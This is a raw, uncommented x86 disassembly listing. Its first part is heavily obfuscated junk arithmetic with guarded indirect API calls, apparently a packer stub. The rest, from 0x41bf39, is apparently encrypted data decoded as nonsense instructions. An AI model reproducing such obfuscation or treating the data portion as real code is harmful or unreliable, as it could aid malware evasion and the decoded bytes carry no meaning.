  41b569:	mov    DWORD PTR [ebp-0x50],0x1
  41b570:	cmp    DWORD PTR ds:0x42857d,0x0
  41b577:	not    ecx
  41b579:	mov    DWORD PTR ds:0x428361,0x24a
  41b583:	jmp    0x41b5df
  41b588:	mov    DWORD PTR ds:0x428369,0x4cf4
  41b592:	mov    eax,0x7057
  41b597:	cmp    DWORD PTR ds:0x42857d,0x0
  41b59e:	jl     0x41b5c3
  41b5a4:	push   DWORD PTR [ebp-0xc]
  41b5a7:	call   DWORD PTR ds:0x42e10c
  41b5ad:	adc    ecx,DWORD PTR ds:0x42842d
  41b5b3:	sbb    DWORD PTR ds:0x428451,0x4277
  41b5bd:	and    DWORD PTR ds:0x4284d5,ecx
  41b5c3:	and    ecx,ecx
  41b5c5:	or     DWORD PTR ds:0x428475,0x5b0f
  41b5cf:	sbb    ecx,0x33b5
  41b5d5:	sub    DWORD PTR ds:0x42844d,0xb05
  41b5df:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41b5e9:	xor    DWORD PTR ds:0x428369,0x1f8b
  41b5f3:	mov    DWORD PTR [ebp-0xb8],0x1
  41b5fd:	mov    ecx,DWORD PTR [ebp-0xb8]
  41b603:	mov    eax,0x584
  41b608:	xor    edx,edx
  41b60a:	div    ecx
  41b60c:	cmp    DWORD PTR ds:0x428501,0x0
  41b613:	mov    DWORD PTR ds:0x428365,0x2b7a
  41b61d:	mov    DWORD PTR ds:0x42854d,0x6434
  41b627:	mov    DWORD PTR ds:0x4284d5,0x53bf
  41b631:	jmp    0x41b6a4
  41b636:	mov    DWORD PTR ds:0x428445,edi
  41b63c:	movzx  ecx,WORD PTR ds:0x428361
  41b643:	cmp    DWORD PTR ds:0x428501,0x0
  41b64a:	jle    0x41b684
  41b650:	push   0x42842d
  41b655:	push   0x428469
  41b65a:	push   0x428405
  41b65f:	call   DWORD PTR ds:0x42e294
  41b665:	xor    DWORD PTR ds:0x4284e5,edi
  41b66b:	movzx  ecx,BYTE PTR ds:0x428341
  41b672:	sub    ecx,DWORD PTR ds:0x428449
  41b678:	mov    DWORD PTR ds:0x428341,ecx
  41b67e:	adc    DWORD PTR ds:0x428441,ecx
  41b684:	adc    ecx,0x4862
  41b68a:	and    ecx,DWORD PTR ds:0x428441
  41b690:	or     DWORD PTR ds:0x4284e5,ecx
  41b696:	mov    ecx,DWORD PTR ds:0x4284c1
  41b69c:	mov    ecx,DWORD PTR [ecx]
  41b69e:	sub    DWORD PTR ds:0x428469,ecx
  41b6a4:	imul   eax,eax,0x51d4
  41b6aa:	sub    ecx,0x11f6
  41b6b0:	mov    ecx,DWORD PTR [ebp-0xbc]
  41b6b6:	add    DWORD PTR ds:0x42842d,0x5690
  41b6c0:	xor    eax,ecx
  41b6c2:	adc    DWORD PTR ds:0x428565,edi
  41b6c8:	and    eax,0x4c09
  41b6cd:	sbb    ecx,0x3053
  41b6d3:	mov    ecx,DWORD PTR [ebp-0x50]
  41b6d6:	sub    DWORD PTR ds:0x428429,0x428479
  41b6e0:	xor    edx,edx
  41b6e2:	div    ecx
  41b6e4:	sbb    ecx,DWORD PTR ds:0x428425
  41b6ea:	sub    eax,0x401
  41b6ef:	mov    ecx,DWORD PTR ds:0x428501
  41b6f5:	sub    DWORD PTR ds:0x428571,ecx
  41b6fb:	mov    DWORD PTR [ebp-0x90],eax
  41b701:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41b70b:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41b712:	cmp    DWORD PTR ds:0x428475,0x0
  41b719:	mov    DWORD PTR ds:0x428359,0x12e0
  41b723:	movzx  edx,WORD PTR ds:0x428439
  41b72a:	jmp    0x41b78a
  41b72f:	not    eax
  41b731:	mov    DWORD PTR ds:0x4284d5,edi
  41b737:	cmp    DWORD PTR ds:0x428475,0x0
  41b73e:	jne    0x41b768
  41b744:	push   0x428157
  41b749:	call   DWORD PTR ds:0x42e298
  41b74f:	movzx  edx,WORD PTR ds:0x42834d
  41b756:	xor    DWORD PTR ds:0x428331,edx
  41b75c:	and    ecx,0x442f
  41b762:	sub    edx,0x55c5
  41b768:	mov    ecx,DWORD PTR ds:0x4284dd
  41b76e:	xor    ecx,DWORD PTR ds:0x4284e5
  41b774:	mov    DWORD PTR ds:0x4284dd,ecx
  41b77a:	and    DWORD PTR ds:0x42835d,0x34b7
  41b784:	adc    DWORD PTR ds:0x428501,ebx
  41b78a:	mov    DWORD PTR [ebp-0xb4],0x3842
  41b794:	adc    ecx,edx
  41b796:	mov    eax,DWORD PTR [ebp-0x4c]
  41b799:	and    ecx,edx
  41b79b:	add    eax,DWORD PTR [ebp-0xb4]
  41b7a1:	xor    eax,0x2e02
  41b7a6:	add    ecx,ecx
  41b7a8:	xor    eax,0x7294
  41b7ad:	add    ecx,ecx
  41b7af:	imul   eax,eax,0x68f3
  41b7b5:	mov    ecx,DWORD PTR [ebp-0x8c]
  41b7bb:	cmp    DWORD PTR ds:0x428361,0x0
  41b7c2:	mov    DWORD PTR ds:0x428469,ebx
  41b7c8:	mov    edx,DWORD PTR ds:0x42857d
  41b7ce:	jmp    0x41b822
  41b7d3:	mov    DWORD PTR ds:0x428355,edx
  41b7d9:	cmp    DWORD PTR ds:0x428361,0x0
  41b7e0:	ja     0x41b810
  41b7e6:	push   DWORD PTR [ebp-0x1c]
  41b7e9:	push   0x2a61
  41b7ee:	push   0x6c90
  41b7f3:	push   0x2be6
  41b7f8:	push   0x2810
  41b7fd:	call   DWORD PTR ds:0x42e054
  41b803:	inc    edx
  41b804:	mov    edx,DWORD PTR ds:0x428351
  41b80a:	sbb    DWORD PTR ds:0x428459,edx
  41b810:	or     edx,DWORD PTR ds:0x428371
  41b816:	and    edx,DWORD PTR ds:0x4284d5
  41b81c:	sub    edx,DWORD PTR ds:0x428569
  41b822:	and    eax,ecx
  41b824:	adc    DWORD PTR ds:0x42846d,0x2bc9
  41b82e:	sub    eax,0x2818
  41b833:	mov    edx,DWORD PTR ds:0x42851d
  41b839:	mov    ecx,DWORD PTR ds:0x428529
  41b83f:	sub    ecx,edx
  41b841:	add    edx,DWORD PTR [edx+ecx*1]
  41b844:	mov    DWORD PTR [ebp-0xe8],eax
  41b84a:	mov    DWORD PTR [ebp-0x70],0x6f89
  41b851:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41b85b:	mov    DWORD PTR [ebp-0x120],0x3c77
  41b865:	sbb    DWORD PTR ds:0x428429,edx
  41b86b:	mov    DWORD PTR [ebp-0x2c],0x2129
  41b872:	cmp    DWORD PTR ds:0x428481,0x0
  41b879:	mov    DWORD PTR ds:0x428375,0x25cb
  41b883:	mov    edx,0x2db2
  41b888:	mov    DWORD PTR ds:0x428501,0x75fd
  41b892:	jmp    0x41b8de
  41b897:	mov    eax,0x420d
  41b89c:	mov    DWORD PTR ds:0x4284dd,0x38f0
  41b8a6:	cmp    DWORD PTR ds:0x428481,0x0
  41b8ad:	jge    0x41b8c8
  41b8b3:	push   DWORD PTR [ebp-0xc]
  41b8b6:	call   DWORD PTR ds:0x42e058
  41b8bc:	adc    DWORD PTR ds:0x42854d,edx
  41b8c2:	add    DWORD PTR ds:0x428571,edx
  41b8c8:	sbb    edx,DWORD PTR ds:0x428565
  41b8ce:	and    DWORD PTR ds:0x4284cd,0x10d1
  41b8d8:	and    ecx,0x7be2
  41b8de:	mov    eax,DWORD PTR [ebp-0x2c]
  41b8e1:	imul   eax,eax,0x1ada
  41b8e7:	xor    DWORD PTR ds:0x428469,ebx
  41b8ed:	mov    ecx,DWORD PTR [ebp-0x120]
  41b8f3:	mov    edx,DWORD PTR ds:0x428415
  41b8f9:	or     edx,DWORD PTR ds:0x428461
  41b8ff:	mov    DWORD PTR ds:0x428415,edx
  41b905:	imul   ecx,ecx,0x53ae
  41b90b:	xor    DWORD PTR ds:0x4284d5,0x220b
  41b915:	imul   ecx,ecx,0x7447
  41b91b:	mov    edx,DWORD PTR [ebp-0xd0]
  41b921:	and    ecx,edx
  41b923:	or     ecx,0x2a20
  41b929:	or     DWORD PTR ds:0x4284d5,0x6762
  41b933:	mov    edx,DWORD PTR [ebp-0x70]
  41b936:	xor    ecx,edx
  41b938:	and    DWORD PTR ds:0x42833d,0x71f
  41b942:	mov    edx,DWORD PTR [ebp+0x14]
  41b945:	or     DWORD PTR ds:0x428451,0x17f4
  41b94f:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41b956:	or     DWORD PTR ds:0x4284f1,0x428481
  41b960:	lea    eax,[ecx+eax*1-0x45a1]
  41b967:	mov    DWORD PTR [ebp-0xb0],eax
  41b96d:	add    ecx,eax
  41b96f:	mov    DWORD PTR [ebp-0x11c],0x303f
  41b979:	mov    DWORD PTR [ebp-0x98],0x51a9
  41b983:	sub    ecx,eax
  41b985:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41b98f:	cmp    DWORD PTR ds:0x428375,0x0
  41b996:	mov    DWORD PTR ds:0x428359,0x245f
  41b9a0:	mov    ecx,DWORD PTR ds:0x42842d
  41b9a6:	mov    ecx,0x273f
  41b9ab:	jmp    0x41ba0f
  41b9b0:	mov    DWORD PTR ds:0x428469,ebx
  41b9b6:	mov    DWORD PTR ds:0x428439,0x963
  41b9c0:	cmp    DWORD PTR ds:0x428375,0x0
  41b9c7:	jle    0x41b9ee
  41b9cd:	push   DWORD PTR [ebp-0x28]
  41b9d0:	push   0x4284cd
  41b9d5:	push   0x4281b5
  41b9da:	call   DWORD PTR ds:0x42e29c
  41b9e0:	sub    DWORD PTR ds:0x42855d,ebx
  41b9e6:	xor    ecx,ecx
  41b9e8:	sbb    DWORD PTR ds:0x4284e5,ebx
  41b9ee:	movzx  ecx,BYTE PTR ds:0x42835d
  41b9f5:	adc    DWORD PTR ds:0x428449,ecx
  41b9fb:	add    DWORD PTR ds:0x428351,0x7cea
  41ba05:	sbb    DWORD PTR ds:0x428355,0x6b1e
  41ba0f:	mov    eax,DWORD PTR [ebp-0xcc]
  41ba15:	xor    eax,0x6f65
  41ba1a:	cmp    DWORD PTR ds:0x42834d,0x0
  41ba21:	mov    DWORD PTR ds:0x428445,edx
  41ba27:	mov    ecx,0x51b5
  41ba2c:	jmp    0x41baa2
  41ba31:	mov    DWORD PTR ds:0x42844d,0xb0f
  41ba3b:	cmp    DWORD PTR ds:0x42834d,0x0
  41ba42:	jl     0x41ba7a
  41ba48:	push   0x200e
  41ba4d:	push   0x21c1
  41ba52:	push   DWORD PTR [ebp-0x14]
  41ba55:	push   DWORD PTR [ebp-0x14]
  41ba58:	call   DWORD PTR ds:0x42e110
  41ba5e:	sub    DWORD PTR ds:0x428419,ecx
  41ba64:	sub    ecx,DWORD PTR ds:0x428545
  41ba6a:	sbb    DWORD PTR ds:0x428421,0x4284fd
  41ba74:	sub    ecx,0x1dd7
  41ba7a:	mov    ecx,DWORD PTR ds:0x428465
  41ba80:	adc    ecx,DWORD PTR ds:0x428579
  41ba86:	mov    DWORD PTR ds:0x428465,ecx
  41ba8c:	adc    DWORD PTR ds:0x428569,0x3dd1
  41ba96:	mov    DWORD PTR ds:0x428369,0x5b91
  41baa0:	neg    ecx
  41baa2:	mov    ecx,DWORD PTR [ebp-0x98]
  41baa8:	add    DWORD PTR ds:0x428575,0x72a
  41bab2:	or     eax,ecx
  41bab4:	xor    DWORD PTR ds:0x428469,ebx
  41baba:	add    eax,0x161e
  41babf:	sub    ecx,0x1ef7
  41bac5:	mov    ecx,DWORD PTR [ebp-0x11c]
  41bacb:	or     eax,ecx
  41bacd:	cmp    DWORD PTR ds:0x428419,0x0
  41bad4:	mov    ecx,DWORD PTR ds:0x428431
  41bada:	mov    DWORD PTR ds:0x428455,0x4d
  41bae4:	jmp    0x41bbad
  41bae9:	mov    DWORD PTR ds:0x428455,0x133b
  41baf3:	cmp    DWORD PTR ds:0x428419,0x0
  41bafa:	jne    0x41bb25
  41bb00:	push   0x428561
  41bb05:	push   0x8a51
  41bb0a:	push   0x81dc
  41bb0f:	call   DWORD PTR ds:0x42e05c
  41bb15:	and    DWORD PTR ds:0x42842d,0x4030
  41bb1f:	sub    DWORD PTR ds:0x4284d9,edx
  41bb25:	add    ecx,0x753f
  41bb2b:	mov    ecx,DWORD PTR ds:0x428415
  41bb31:	xor    DWORD PTR ds:0x428411,ecx
  41bb37:	sbb    DWORD PTR ds:0x42855d,edx
  41bb3d:	cmp    DWORD PTR ds:0x428571,0x0
  41bb44:	mov    ecx,DWORD PTR ds:0x428575
  41bb4a:	mov    ecx,DWORD PTR ds:0x4284f1
  41bb50:	mov    DWORD PTR ds:0x42846d,edx
  41bb56:	mov    DWORD PTR ds:0x428425,edi
  41bb5c:	jmp    0x41bbad
  41bb61:	not    ecx
  41bb63:	cmp    DWORD PTR ds:0x428571,0x0
  41bb6a:	jne    0x41bb96
  41bb70:	push   0x6108
  41bb75:	push   0x2ee0
  41bb7a:	push   0x428295
  41bb7f:	push   0x1382
  41bb84:	call   DWORD PTR ds:0x42e060
  41bb8a:	or     DWORD PTR ds:0x4284c9,edi
  41bb90:	neg    DWORD PTR ds:0x428355
  41bb96:	movzx  ecx,WORD PTR ds:0x428559
  41bb9d:	sbb    DWORD PTR ds:0x428471,ecx
  41bba3:	or     DWORD PTR ds:0x428445,0x428451
  41bbad:	add    eax,0x1cca
  41bbb2:	cmp    DWORD PTR ds:0x428351,0x0
  41bbb9:	mov    DWORD PTR ds:0x428451,0x3c56
  41bbc3:	mov    ecx,0x7f6d
  41bbc8:	mov    ecx,DWORD PTR ds:0x42844d
  41bbce:	jmp    0x41bc28
  41bbd3:	not    ecx
  41bbd5:	cmp    DWORD PTR ds:0x428351,0x0
  41bbdc:	jbe    0x41bc10
  41bbe2:	push   0x5de5
  41bbe7:	push   0x42827f
  41bbec:	push   0x27d6
  41bbf1:	call   DWORD PTR ds:0x42e114
  41bbf7:	movzx  ecx,BYTE PTR ds:0x428371
  41bbfe:	adc    DWORD PTR ds:0x428365,ecx
  41bc04:	sbb    ecx,0x4cc7
  41bc0a:	sbb    ecx,DWORD PTR ds:0x42844d
  41bc10:	adc    DWORD PTR ds:0x428579,ebx
  41bc16:	mov    ecx,DWORD PTR ds:0x42833d
  41bc1c:	sub    DWORD PTR ds:0x428581,ecx
  41bc22:	add    ecx,0x5653
  41bc28:	xor    eax,0x96c9
  41bc2d:	sbb    DWORD PTR ds:0x428579,0x433e
  41bc37:	mov    DWORD PTR [ebp-0x38],eax
  41bc3a:	mov    DWORD PTR [ebp-0x118],0x6083
  41bc44:	sub    DWORD PTR ds:0x42832d,0x67a3
  41bc4e:	mov    DWORD PTR [ebp-0x88],0x556
  41bc58:	or     ecx,eax
  41bc5a:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41bc64:	cmp    DWORD PTR ds:0x4284d1,0x0
  41bc6b:	mov    ecx,0x31c9
  41bc70:	mov    DWORD PTR ds:0x428579,0x1996
  41bc7a:	jmp    0x41bccd
  41bc7f:	mov    DWORD PTR ds:0x4284cd,edi
  41bc85:	cmp    DWORD PTR ds:0x4284d1,0x0
  41bc8c:	jb     0x41bcb3
  41bc92:	push   0x4282f3
  41bc97:	push   DWORD PTR [ebp-0x14]
  41bc9a:	call   DWORD PTR ds:0x42e118
  41bca0:	add    ecx,DWORD PTR ds:0x428455
  41bca6:	movzx  ecx,BYTE PTR ds:0x428479
  41bcad:	add    DWORD PTR ds:0x428365,ecx
  41bcb3:	sub    DWORD PTR ds:0x4284d5,ecx
  41bcb9:	xor    ecx,ecx
  41bcbb:	add    ecx,DWORD PTR ds:0x428409
  41bcc1:	or     DWORD PTR ds:0x428549,ecx
  41bcc7:	add    DWORD PTR ds:0x428411,ebx
  41bccd:	mov    eax,DWORD PTR [ebp-0x140]
  41bcd3:	add    eax,0x5af8
  41bcd8:	sbb    ecx,0x75c4
  41bcde:	mov    ecx,DWORD PTR [ebp-0x88]
  41bce4:	sub    eax,ecx
  41bce6:	mov    ecx,DWORD PTR [ebp-0x118]
  41bcec:	xor    DWORD PTR ds:0x428565,0x6d4
  41bcf6:	lea    eax,[eax+ecx*1+0x68dc]
  41bcfd:	or     eax,0x52f6
  41bd02:	cmp    DWORD PTR ds:0x428459,0x0
  41bd09:	mov    DWORD PTR ds:0x428545,0x1421
  41bd13:	mov    DWORD PTR ds:0x428481,0x487c
  41bd1d:	mov    ecx,DWORD PTR ds:0x428435
  41bd23:	jmp    0x41bd91
  41bd28:	mov    DWORD PTR ds:0x42844d,0x10ed
  41bd32:	not    ecx
  41bd34:	cmp    DWORD PTR ds:0x428459,0x0
  41bd3b:	jbe    0x41bd77
  41bd41:	push   0x8eb3
  41bd46:	call   DWORD PTR ds:0x42e11c
  41bd4c:	mov    ecx,DWORD PTR ds:0x4284d5
  41bd52:	sub    DWORD PTR ds:0x428361,ecx
  41bd58:	mov    ecx,DWORD PTR ds:0x428431
  41bd5e:	sbb    ecx,DWORD PTR ds:0x428461
  41bd64:	mov    DWORD PTR ds:0x428431,ecx
  41bd6a:	movzx  ecx,BYTE PTR ds:0x42834d
  41bd71:	or     DWORD PTR ds:0x4284c5,ecx
  41bd77:	sbb    DWORD PTR ds:0x428345,ebx
  41bd7d:	neg    ecx
  41bd7f:	mov    ecx,DWORD PTR ds:0x428355
  41bd85:	xor    ecx,DWORD PTR ds:0x428409
  41bd8b:	mov    DWORD PTR ds:0x428355,ecx
  41bd91:	sub    eax,0x1dbfe
  41bd96:	sbb    DWORD PTR ds:0x4284e9,ecx
  41bd9c:	mov    DWORD PTR [ebp-0xac],eax
  41bda2:	xor    DWORD PTR ds:0x42842d,ebx
  41bda8:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41bdaf:	mov    DWORD PTR [ebp-0x100],0x49f7
  41bdb9:	inc    ecx
  41bdba:	mov    eax,DWORD PTR [ebp-0x100]
  41bdc0:	movzx  ecx,BYTE PTR ds:0x428555
  41bdc7:	sub    ecx,DWORD PTR ds:0x4284c9
  41bdcd:	mov    DWORD PTR ds:0x428555,ecx
  41bdd3:	add    eax,0x7b60
  41bdd8:	sbb    ecx,0x7111
  41bdde:	imul   eax,eax,0x5ea
  41bde4:	add    DWORD PTR ds:0x428475,ecx
  41bdea:	mov    ecx,DWORD PTR [ebp-0x6c]
  41bded:	imul   eax,ecx
  41bdf0:	xor    edx,edx
  41bdf2:	adc    DWORD PTR ds:0x428411,0x2190
  41bdfc:	mov    ecx,0x3218d
  41be01:	div    ecx
  41be03:	sub    eax,0x24c1
  41be08:	sbb    ecx,0x10cc
  41be0e:	mov    DWORD PTR [ebp-0xa8],eax
  41be14:	xor    eax,eax
  41be16:	add    eax,DWORD PTR ds:0x4284dd
  41be1c:	sbb    eax,DWORD PTR ds:0x428475
  41be22:	mov    ds:0x4284dd,eax
  41be27:	mov    DWORD PTR [ebp-0x84],0x2c40
  41be31:	xor    ecx,ecx
  41be33:	or     ecx,DWORD PTR ds:0x428411
  41be39:	xor    ecx,DWORD PTR ds:0x428471
  41be3f:	mov    DWORD PTR ds:0x428411,ecx
  41be45:	mov    DWORD PTR [ebp-0x18],0x6013
  41be4c:	or     DWORD PTR ds:0x428559,ecx
  41be52:	mov    DWORD PTR [ebp-0x80],0xc
  41be59:	and    eax,eax
  41be5b:	mov    eax,DWORD PTR [ebp-0x18]
  41be5e:	and    DWORD PTR ds:0x4284c5,edi
  41be64:	mov    ecx,DWORD PTR [ebp-0x80]
  41be67:	xor    edx,edx
  41be69:	add    DWORD PTR ds:0x42836d,0x428361
  41be73:	div    ecx
  41be75:	imul   eax,eax,0x4312
  41be7b:	cmp    DWORD PTR ds:0x4284e1,0x0
  41be82:	mov    DWORD PTR ds:0x428411,0x6e4f
  41be8c:	movzx  ecx,WORD PTR ds:0x428579
  41be93:	mov    DWORD PTR ds:0x428555,edi
  41be99:	jmp    0x41befc
  41be9e:	mov    DWORD PTR ds:0x42833d,0x5f09
  41bea8:	cmp    DWORD PTR ds:0x4284e1,0x0
  41beaf:	jge    0x41bed8
  41beb5:	push   DWORD PTR [ebp-0x28]
  41beb8:	call   DWORD PTR ds:0x42e064
  41bebe:	sbb    ecx,DWORD PTR ds:0x4284cd
  41bec4:	xor    ecx,ecx
  41bec6:	xor    ecx,DWORD PTR ds:0x428431
  41becc:	sub    DWORD PTR ds:0x428365,ecx
  41bed2:	and    DWORD PTR ds:0x428439,edi
  41bed8:	xor    ecx,ecx
  41beda:	xor    ecx,DWORD PTR ds:0x428569
  41bee0:	xor    DWORD PTR ds:0x428405,ecx
  41bee6:	or     DWORD PTR ds:0x428445,0x15e9
  41bef0:	xor    ecx,0x6843
  41bef6:	adc    ecx,DWORD PTR ds:0x428449
  41befc:	add    eax,0x5abe
  41bf01:	mov    ecx,DWORD PTR [ebp-0x84]
  41bf07:	add    DWORD PTR ds:0x4284e1,0x428579
  41bf11:	xor    eax,ecx
  41bf13:	mov    ecx,DWORD PTR ds:0x428359
  41bf19:	and    ecx,DWORD PTR ds:0x42855d
  41bf1f:	mov    DWORD PTR ds:0x428359,ecx
  41bf25:	xor    edx,edx
  41bf27:	not    DWORD PTR ds:0x428369
  41bf2d:	mov    ecx,0x5ae
  41bf32:	div    ecx
  41bf34:	jmp    0x41c31b
  41bf39:	xchg   DWORD PTR [edi],esp
  41bf3b:	dec    eax
  41bf3c:	in     al,0x68
  41bf3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf3f:	lods   al,BYTE PTR ds:[esi]
  41bf40:	stos   DWORD PTR es:[edi],eax
  41bf41:	test   BYTE PTR [ebx+eax*8+0x7ead45cf],bh
  41bf48:	iret   
  41bf49:	aam    0x3b
  41bf4b:	sar    BYTE PTR [esi-0x41413bb6],0x36
  41bf52:	mov    ecx,0x1cfcc1cb
  41bf57:	dec    esp
  41bf58:	jo     0x41bef7
  41bf5a:	add    ebp,DWORD PTR [ebx-0x6e80f0d6]
  41bf60:	jecxz  0x41bfce
  41bf62:	fst    DWORD PTR [esi-0xa231dc7]
  41bf68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf69:	das    
  41bf6a:	sbb    eax,DWORD PTR [ebp-0x33]
  41bf6d:	loopne 0x41bf8e
  41bf6f:	retf   0xa06a
  41bf72:	pop    ds
  41bf73:	sbb    al,BYTE PTR [esi-0x59ffc5e6]
  41bf79:	int3   
  41bf7a:	cmp    al,0x62
  41bf7c:	adc    eax,0xbab2a3f0
  41bf81:	push   esp
  41bf82:	retf   0xc383
  41bf85:	mov    bl,ch
  41bf87:	cs dec ebx
  41bf89:	pushf  
  41bf8a:	push   ss
  41bf8b:	pushf  
  41bf8c:	sahf   
  41bf8d:	jmp    0xd61c:0xcdd36e6b
  41bf94:	jle    0x41bf57
  41bf96:	dec    esi
  41bf97:	mov    bh,0x72
  41bf99:	and    esp,ebx
  41bf9b:	sub    al,0xe
  41bf9d:	(bad)  
  41bf9e:	mov    al,ds:0x1e6e869e
  41bfa3:	arpl   WORD PTR [edx+0x3c3205e5],di
  41bfa9:	shl    BYTE PTR [ecx+0x52],0x20
  41bfad:	xor    al,0x25
  41bfaf:	loop   0x41bf51
  41bfb1:	ficom  WORD PTR [ebp-0x4c499776]
  41bfb7:	popa   
  41bfb8:	inc    esi
  41bfb9:	xchg   DWORD PTR [edi-0x19],ecx
  41bfbc:	push   ss
  41bfbd:	mov    esp,0x82993a7
  41bfc2:	or     ebp,DWORD PTR ds:[ebx+eiz*1-0x4e]
  41bfc7:	jns    0x41c008
  41bfc9:	imul   esp,DWORD PTR [esi+0x8],0x50
  41bfcd:	ins    BYTE PTR es:[edi],dx
  41bfce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfcf:	adc    DWORD PTR [ecx+0x56d88acf],edi
  41bfd5:	sbb    al,BYTE PTR [ecx-0x692b034c]
  41bfdb:	je     0x41bf7c
  41bfdd:	mov    ebx,es
  41bfdf:	or     eax,0x98d1b0ed
  41bfe4:	or     eax,0x617963ae
  41bfe9:	dec    ecx
  41bfea:	rol    BYTE PTR [edx],0xce
  41bfed:	jb     0x41bfcd
  41bfef:	jne    0x41bfcf
  41bff1:	lea    esi,[edx+0x62]
  41bff4:	(bad)
  41bff8:	dec    esp
  41bff9:	in     al,0xcb
  41bffb:	mov    ds:0xcd4c6e1c,eax
  41c000:	add    ecx,DWORD PTR [ebp+0x3bdeec8d]
  41c006:	(bad)  
  41c007:	adc    DWORD PTR [edx+ecx*1+0x4c731837],esp
  41c00e:	lock mov ch,0xc9
  41c011:	or     BYTE PTR ds:0xbd2289b2,dh
  41c017:	stos   BYTE PTR es:[edi],al
  41c018:	push   esi
  41c019:	shl    BYTE PTR [edx-0x1ad67f4a],1
  41c01f:	iret   
  41c020:	mov    esp,0x5604b7aa
  41c025:	mov    bl,0xdb
  41c027:	aad    0xc7
  41c029:	rcr    BYTE PTR [ecx+0x1712401e],cl
  41c02f:	lock scas al,BYTE PTR es:[edi]
  41c031:	lods   eax,DWORD PTR ds:[esi]
  41c032:	cmp    bh,BYTE PTR [ebp-0x5b]
  41c035:	xlat   BYTE PTR ds:[ebx]
  41c036:	pop    eax
  41c037:	xchg   al,ch
  41c039:	fisttp DWORD PTR [ebp+esi*2+0xf]
  41c03d:	das    
  41c03e:	mov    ds:0x27460794,eax
  41c043:	push   esi
  41c044:	xchg   ebp,eax
  41c045:	push   edx
  41c046:	jmp    0x41c0c2
  41c048:	xor    eax,0xb14b60ea
  41c04d:	push   ds
  41c04e:	in     al,0x3b
  41c050:	lahf   
  41c051:	and    bl,dh
  41c053:	inc    BYTE PTR [ecx-0x56]
  41c056:	and    al,0x75
  41c058:	call   0xc2a81cd2
  41c05d:	sti    
  41c05e:	ret    0x5ea3
  41c061:	sbb    BYTE PTR [esi-0x4a1dca4],ch
  41c067:	dec    ecx
  41c068:	jns    0x41c045
  41c06a:	jnp    0x41c0cc
  41c06c:	sbb    eax,0x9a432514
  41c071:	stos   BYTE PTR es:[edi],al
  41c072:	adc    bl,BYTE PTR [eax-0x25c56943]
  41c078:	pop    ebp
  41c079:	in     al,dx
  41c07a:	or     BYTE PTR [ebx-0x48704806],0xa1
  41c081:	sub    dl,ah
  41c083:	call   0x63e038f8
  41c088:	das    
  41c089:	sbb    eax,DWORD PTR [edi]
  41c08b:	mov    eax,ds:0x5dab7590
  41c090:	call   0x2cd43b0c
  41c095:	inc    ecx
  41c096:	into   
  41c097:	fisubr DWORD PTR [ebp-0x3367b204]
  41c09d:	mov    DWORD PTR [ebp-0x1b],eax
  41c0a0:	fs lock inc ecx
  41c0a3:	test   al,0x56
  41c0a5:	and    eax,0xd081fc6f
  41c0aa:	outs   dx,BYTE PTR ds:[esi]
  41c0ab:	push   ss
  41c0ac:	imul   ecx,edx,0x7b2a7730
  41c0b2:	xchg   ebx,eax
  41c0b3:	dec    ecx
  41c0b4:	jns    0x41c087
  41c0b6:	icebp  
  41c0b7:	aas    
  41c0b8:	mov    ds:0x9f782e3d,eax
  41c0bd:	stos   DWORD PTR es:[edi],eax
  41c0be:	nop
  41c0bf:	sub    BYTE PTR [ebx+0x648324bd],0xb6
  41c0c6:	jp     0x41c0fb
  41c0c8:	pop    edx
  41c0c9:	shr    DWORD PTR [edi+0x53839fe3],1
  41c0cf:	dec    ecx
  41c0d0:	push   cs
  41c0d1:	fidivr DWORD PTR [edx+0x442d219d]
  41c0d7:	sub    BYTE PTR [esi],0x65
  41c0da:	ss (bad) 
  41c0dc:	clc    
  41c0dd:	test   DWORD PTR [esi-0x20a204a7],ebx
  41c0e3:	fild   QWORD PTR [esi]
  41c0e5:	sub    esi,edx
  41c0e7:	or     cl,BYTE PTR [ecx+0x3f26862b]
  41c0ed:	jb     0x41c107
  41c0ef:	je     0x41c115
  41c0f1:	pushf  
  41c0f2:	adc    DWORD PTR [edx],esi
  41c0f4:	fs retf 0x154e
  41c0f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0f9:	ins    BYTE PTR es:[edi],dx
  41c0fa:	out    dx,al
  41c0fb:	in     eax,0xf0
  41c0fd:	inc    edx
  41c0fe:	outs   dx,BYTE PTR ds:[esi]
  41c0ff:	cmp    eax,0xfbca65d0
  41c104:	xchg   cl,al
  41c106:	inc    edx
  41c107:	and    BYTE PTR [ebx],ah
  41c109:	shr    cl,0xd
  41c10c:	adc    DWORD PTR [edx+0x32],esp
  41c10f:	mov    bh,0xf0
  41c111:	(bad)  
  41c112:	out    dx,eax
  41c113:	xor    ebp,esi
  41c115:	jae    0x41c0c2
  41c117:	inc    esi
  41c118:	dec    ecx
  41c119:	jg     0x41c15f
  41c11b:	or     DWORD PTR [esp+edi*2-0x39],esp
  41c11f:	and    edi,DWORD PTR [ecx-0x1d]
  41c122:	jo     0x41c0af
  41c124:	pop    esi
  41c125:	ins    BYTE PTR es:[edi],dx
  41c126:	pop    ss
  41c127:	sbb    ah,BYTE PTR [eax-0x3e2e0a07]
  41c12d:	inc    ebx
  41c12e:	jg     0x41c133
  41c130:	cmp    al,0x3c
  41c132:	pop    esi
  41c133:	sbb    edx,DWORD PTR [ecx-0x845e3e5]
  41c139:	retf   
  41c13a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c13b:	sub    edx,edi
  41c13d:	sub    al,bl
  41c13f:	and    al,0x41
  41c141:	xor    ebp,DWORD PTR [eax+esi*4]
  41c144:	inc    ebp
  41c145:	jb     0x41c14e
  41c147:	data16 mov al,0x76
  41c14a:	in     eax,0x69
  41c14c:	sbb    DWORD PTR [edx],edi
  41c14e:	mov    al,ds:0xc77777b9
  41c153:	jo     0x41c0e9
  41c155:	call   0xbdca:0x75aaa8e6
  41c15c:	add    ebx,edx
  41c15e:	outs   dx,DWORD PTR ds:[esi]
  41c15f:	fdiv   QWORD PTR [ebx]
